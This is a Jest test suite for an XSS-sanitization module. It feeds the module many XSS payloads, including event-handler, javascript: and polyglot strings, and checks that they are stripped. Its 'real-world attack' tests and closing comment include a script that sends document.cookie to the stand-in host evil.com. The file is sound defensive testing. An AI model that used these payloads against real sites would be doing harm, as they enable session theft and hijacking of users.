import { describe, it, expect } from '@jest/globals';
import {
  sanitizeInput,
  sanitizeObject,
  sanitizeArray,
  sanitizeUserInput,
  sanitizeStrategyInput,
  sanitizeBacktestInput,
} from './sanitization';

describe('XSS Sanitization', () => {
  describe('sanitizeInput', () => {
    it('should remove script tags', () => {
      const malicious = '<script>alert("XSS")</script>';
      const result = sanitizeInput(malicious);
      expect(result).toBe('');
    });

    it('should remove img tags with onerror', () => {
      const malicious = '<img src=x onerror=alert(1)>';
      const result = sanitizeInput(malicious);
      expect(result).toBe('');
    });

    it('should preserve normal text', () => {
      const normal = 'Normal text';
      const result = sanitizeInput(normal);
      expect(result).toBe('Normal text');
    });

    it('should remove HTML tags but keep text content', () => {
      const html = 'Text with <b>bold</b> and <i>italic</i>';
      const result = sanitizeInput(html);
      expect(result).toBe('Text with bold and italic');
    });

    it('should handle iframe injection', () => {
      const malicious = '<iframe src="javascript:alert(1)"></iframe>';
      const result = sanitizeInput(malicious);
      expect(result).toBe('');
    });

    it('should handle svg with script', () => {
      const malicious = '<svg onload=alert(1)>';
      const result = sanitizeInput(malicious);
      expect(result).toBe('');
    });

    it('should handle javascript: protocol', () => {
      const malicious = '<a href="javascript:alert(1)">Click</a>';
      const result = sanitizeInput(malicious);
      expect(result).toBe('Click');
    });

    it('should handle data: protocol', () => {
      const malicious = '<object data="data:text/html,<script>alert(1)</script>"></object>';
      const result = sanitizeInput(malicious);
      expect(result).toBe('');
    });

    it('should handle event handlers in various tags', () => {
      const tests = [
        '<div onclick="alert(1)">Click</div>',
        '<button onmouseover="alert(1)">Hover</button>',
        '<input onfocus="alert(1)">',
        '<body onload="alert(1)">',
      ];

      tests.forEach(malicious => {
        const result = sanitizeInput(malicious);
        expect(result).not.toContain('alert');
        expect(result).not.toContain('onclick');
        expect(result).not.toContain('onmouseover');
        expect(result).not.toContain('onfocus');
        expect(result).not.toContain('onload');
      });
    });

    it('should handle encoded attacks', () => {
      const malicious = '&lt;script&gt;alert(1)&lt;/script&gt;';
      const result = sanitizeInput(malicious);
      // DOMPurify will decode and then sanitize
      expect(result).not.toContain('script');
    });

    it('should handle mixed case attacks', () => {
      const malicious = '<ScRiPt>alert(1)</sCrIpT>';
      const result = sanitizeInput(malicious);
      expect(result).toBe('');
    });

    it('should return non-string values unchanged', () => {
      expect(sanitizeInput(null as any)).toBe(null);
      expect(sanitizeInput(undefined as any)).toBe(undefined);
      expect(sanitizeInput(123 as any)).toBe(123);
    });
  });

  describe('sanitizeObject', () => {
    it('should sanitize all string properties', () => {
      const obj = {
        name: '<script>alert(1)</script>Name',
        description: '<img src=x onerror=alert(1)>',
        normal: 'Normal text',
      };
      const result = sanitizeObject(obj);
      expect(result.name).toBe('Name');
      expect(result.description).toBe('');
      expect(result.normal).toBe('Normal text');
    });

    it('should handle nested objects', () => {
      const obj = {
        user: {
          name: '<script>alert(1)</script>',
          email: 'test@example.com',
        },
      };
      const result = sanitizeObject(obj);
      expect(result.user.name).toBe('');
      expect(result.user.email).toBe('test@example.com');
    });

    it('should handle arrays of strings', () => {
      const obj = {
        tags: ['<script>tag1</script>', 'normal tag', '<img src=x>'],
      };
      const result = sanitizeObject(obj);
      expect(result.tags).toEqual(['tag1', 'normal tag', '']);
    });

    it('should preserve non-string values', () => {
      const obj = {
        count: 42,
        active: true,
        date: new Date(),
        empty: null,
      };
      const result = sanitizeObject(obj);
      expect(result.count).toBe(42);
      expect(result.active).toBe(true);
      expect(result.date).toBeInstanceOf(Date);
      expect(result.empty).toBe(null);
    });
  });

  describe('sanitizeArray', () => {
    it('should sanitize all strings in array', () => {
      const arr = [
        '<script>alert(1)</script>',
        'Normal text',
        '<img src=x onerror=alert(1)>',
      ];
      const result = sanitizeArray(arr);
      expect(result).toEqual(['', 'Normal text', '']);
    });

    it('should return non-array values unchanged', () => {
      expect(sanitizeArray(null as any)).toBe(null);
      expect(sanitizeArray(undefined as any)).toBe(undefined);
      expect(sanitizeArray('string' as any)).toBe('string');
    });
  });

  describe('sanitizeUserInput', () => {
    it('should sanitize username', () => {
      const user = {
        username: '<script>alert(1)</script>admin',
        password: 'password123', // Should not be sanitized (hashed separately)
      };
      const result = sanitizeUserInput(user);
      expect(result.username).toBe('admin');
      expect(result.password).toBe('password123');
    });

    it('should sanitize email', () => {
      const user = {
        email: '<script>test@example.com</script>',
      };
      const result = sanitizeUserInput(user);
      expect(result.email).toBe('test@example.com');
    });

    it('should sanitize displayName and bio', () => {
      const user = {
        displayName: '<b>Admin User</b>',
        bio: '<script>alert(1)</script>Developer',
      };
      const result = sanitizeUserInput(user);
      expect(result.displayName).toBe('Admin User');
      expect(result.bio).toBe('Developer');
    });
  });

  describe('sanitizeStrategyInput', () => {
    it('should sanitize strategy name', () => {
      const strategy = {
        name: '<script>alert(1)</script>My Strategy',
        description: '<img src=x onerror=alert(1)>Great strategy',
      };
      const result = sanitizeStrategyInput(strategy);
      expect(result.name).toBe('My Strategy');
      expect(result.description).toBe('Great strategy');
    });

    it('should sanitize notes', () => {
      const strategy = {
        notes: '<iframe src="evil.com"></iframe>Important notes',
      };
      const result = sanitizeStrategyInput(strategy);
      expect(result.notes).toBe('Important notes');
    });
  });

  describe('sanitizeBacktestInput', () => {
    it('should sanitize backtest fields', () => {
      const backtest = {
        name: '<script>Backtest 1</script>',
        description: '<img src=x>Test backtest',
        notes: '<b>Important</b> results',
      };
      const result = sanitizeBacktestInput(backtest);
      expect(result.name).toBe('Backtest 1');
      expect(result.description).toBe('Test backtest');
      expect(result.notes).toBe('Important results');
    });
  });

  describe('Real-world attack scenarios', () => {
    it('should prevent session stealing via username', () => {
      const maliciousUsername = '<script>fetch("evil.com/steal?cookie="+document.cookie)</script>';
      const result = sanitizeInput(maliciousUsername);
      expect(result).toBe('');
      expect(result).not.toContain('script');
      expect(result).not.toContain('fetch');
    });

    it('should prevent DOM-based XSS in strategy name', () => {
      const maliciousName = '"><script>document.location="http://evil.com"</script>';
      const result = sanitizeInput(maliciousName);
      expect(result).not.toContain('script');
      expect(result).not.toContain('document.location');
    });

    it('should prevent XSS in description fields', () => {
      const maliciousDesc = '<svg/onload=alert(document.cookie)>';
      const result = sanitizeInput(maliciousDesc);
      expect(result).toBe('');
      expect(result).not.toContain('onload');
      expect(result).not.toContain('alert');
    });

    it('should prevent mutation XSS (mXSS)', () => {
      const mxss = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
      const result = sanitizeInput(mxss);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('img');
    });

    it('should handle polyglot XSS payloads', () => {
      const polyglot = 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>';
      const result = sanitizeInput(polyglot);
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('onload');
      expect(result).not.toContain('onmouseover');
      expect(result).not.toContain('alert');
    });
  });

  describe('Edge cases', () => {
    it('should handle empty strings', () => {
      expect(sanitizeInput('')).toBe('');
    });

    it('should handle very long strings', () => {
      const longString = 'a'.repeat(10000);
      const result = sanitizeInput(longString);
      expect(result).toBe(longString);
    });

    it('should handle unicode characters', () => {
      const unicode = 'Hello 世界 🌍';
      const result = sanitizeInput(unicode);
      expect(result).toBe(unicode);
    });

    it('should handle special characters', () => {
      const special = '!@#$%^&*()_+-={}[]|:";\'<>?,./';
      const result = sanitizeInput(special);
      // Angle brackets should be removed/escaped
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });

    it('should handle NULL bytes', () => {
      const nullByte = 'test\x00<script>alert(1)</script>';
      const result = sanitizeInput(nullByte);
      expect(result).not.toContain('script');
    });
  });
});

/**
 * Test cases demonstrating the security improvements:
 *
 * BEFORE (VULNERABLE):
 * - User creates account with username: '<script>fetch("evil.com/steal?cookie="+document.cookie)</script>'
 * - Username stored in database as-is
 * - When displayed in UI, script executes
 * - Attacker receives stolen session cookie
 * - Attacker can hijack user session
 *
 * AFTER (PROTECTED):
 * - User submits malicious username
 * - sanitizeInput() strips all HTML tags
 * - Only empty string or text content stored in database
 * - No script execution in UI
 * - Session remains secure
 *
 * ATTACK VECTORS PREVENTED:
 * 1. Script injection (<script> tags)
 * 2. Event handler injection (onclick, onerror, etc.)
 * 3. Protocol injection (javascript:, data:)
 * 4. HTML injection (<img>, <iframe>, <svg>, etc.)
 * 5. Encoded attacks (&lt;script&gt;)
 * 6. Mixed case attacks (<ScRiPt>)
 * 7. Mutation XSS (mXSS)
 * 8. Polyglot payloads
 */
